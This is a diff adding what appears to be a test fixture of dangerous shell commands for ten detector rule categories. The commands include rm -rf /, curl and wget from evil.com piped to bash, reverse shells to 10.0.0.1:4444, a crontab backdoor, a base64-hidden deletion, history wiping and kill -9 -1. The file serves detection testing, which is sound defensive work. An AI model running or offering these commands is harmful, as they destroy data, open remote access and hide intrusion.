@@ -1,0 +1,36 @@
+# Commands covering all 10 SCD rule categories
+# R-01: Privilege escalation
+sudo su
+sudo -i
+sudo bash
+# R-02: Recursive deletion
+rm -rf /
+rm -rf /*
+rm -rf ~
+# R-03: chmod 777 on system dirs
+chmod 777 /etc/passwd
+chmod 777 /bin/sh
+chmod 777 /usr/local
+# R-04: Remote code execution
+curl http://evil.com/payload.sh | bash
+wget http://evil.com/malware.sh | sh
+# R-05: Reverse shell
+nc -e /bin/bash 10.0.0.1 4444
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+# R-06: Persistence
+echo "* * * * * /tmp/backdoor" >> /etc/crontab
+echo "export PATH=/tmp:$PATH" >> ~/.bashrc
+echo "malware_start" >> ~/.profile
+# R-07: Obfuscation
+echo "cm0gLXJmIC8=" | base64 -d | bash
+# R-08: History evasion
+unset HISTFILE
+history -c
+export HISTFILESIZE=0
+# R-09: Privileged file manipulation
+chown root:root /tmp/exploit
+chattr +i /tmp/protected
+visudo
+# R-10: Aggressive process termination
+kill -9 -1
+pkill -f "critical_service"
